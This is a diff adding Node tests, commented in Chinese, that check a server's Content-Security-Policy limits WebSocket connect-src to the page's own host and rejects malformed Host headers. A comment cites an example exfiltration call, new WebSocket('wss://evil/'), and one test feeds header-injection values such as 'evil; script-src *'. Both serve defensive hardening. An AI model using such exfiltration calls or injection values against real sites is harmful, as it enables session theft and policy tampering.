@@ -92,6 +92,63 @@ test('setSecurityHeaders pins form-action and base-uri so injected markup cannot
   assert.match(csp, /base-uri 'none'/);
 });
 
+// L2（2026-09-17 安全审查）：connect-src 原本是 `'self' ws: wss:`。裸的 scheme 不限主机——
+// 只要 CSP 的 script 那一层被突破一次（目前 script-src 'self' 很紧，但这正是纵深要防的那一格），
+// 注入的脚本就能 `new WebSocket('wss://evil/')` 把会话内容整段外带，而 connect-src 不拦。
+//
+// 【为什么按本页 Host 列出来，而不是只写 'self'】CSP3 规范里 'self' 应当覆盖同源的 ws/wss，
+// 但 Safari 在这一格上历史有坑，而 iOS PWA 是本产品的主要目标之一 —— 判错的后果是 socket
+// 连不上、整个 app 在 iOS 上不可用。显式列出同源的 ws:// 与 wss:// 不依赖那条规范细节，
+// 收紧程度完全一样（列的就是本页自己的源）。
+test.describe('setSecurityHeaders: connect-src 收紧到同源（L2）', () => {
+  const cspFor = (host) => {
+    const headers = new Map();
+    setSecurityHeaders({ setHeader: (n, v) => headers.set(n, v) }, host);
+    return headers.get('Content-Security-Policy');
+  };
+
+  test('带 Host 时列出同源的 ws/wss，且不留裸 scheme', () => {
+    const csp = cspFor('ccm.example.com');
+    assert.match(csp, /connect-src 'self' ws:\/\/ccm\.example\.com wss:\/\/ccm\.example\.com/);
+    // ★ 这条是本次改动的全部意义所在：裸 `ws:` / `wss:` 不限主机
+    assert.doesNotMatch(csp, /connect-src[^;]*\sws:\s/, '不得留下不限主机的裸 ws:');
+    assert.doesNotMatch(csp, /connect-src[^;]*\swss:\s/, '不得留下不限主机的裸 wss:');
+  });
+
+  test('带端口的 Host 原样保留（局域网走 http://ip:3000，端口是源的一部分）', () => {
+    assert.match(cspFor('192.168.1.9:3000'),
+      /connect-src 'self' ws:\/\/192\.168\.1\.9:3000 wss:\/\/192\.168\.1\.9:3000/);
+  });
+
+  // 没有 Host 头就没有「同源」可列。回落到 'self' 而不是回落到裸 scheme：
+  // 失败方向是更严，不是更松。
+  test('没有 Host 时只留 self（失败方向是更严）', () => {
+    for (const h of [undefined, null, '']) {
+      const csp = cspFor(h);
+      assert.match(csp, /connect-src 'self'(;|$)/);
+      assert.doesNotMatch(csp, /ws:/, '取不到 Host 时不得回落成裸 scheme');
+    }
+  });
+
+  // Host 是客户端可控的。值里带分号/空格/引号就能往 CSP 里塞别的指令——只害到他自己那一个
+  // 响应，但没有理由让一个畸形输入改写策略结构。形状不对就当没有。
+  test('畸形 Host 不得注入 CSP 指令，按「没有 Host」处理', () => {
+    for (const bad of ['evil; script-src *', 'a b', 'has"quote', 'has\'quote', '../x']) {
+      const csp = cspFor(bad);
+      assert.match(csp, /connect-src 'self'(;|$)/, `${JSON.stringify(bad)} 应被当成没有 Host`);
+      assert.doesNotMatch(csp, /script-src \*/, 'CSP 指令被注入了');
+    }
+  });
+
+  test('其余指令不受影响（改一处不该动到别处）', () => {
+    const csp = cspFor('ccm.example.com');
+    for (const d of [/default-src 'self'/, /script-src 'self'/, /frame-ancestors 'none'/,
+      /form-action 'self'/, /base-uri 'none'/, /img-src 'self' data:/]) {
+      assert.match(csp, d);
+    }
+  });
+});
+
 test('createHttpAuth uses Access JWT for public hosts and token fallback for local requests', async () => {
   const verified = [];
   const auth = createHttpAuth({
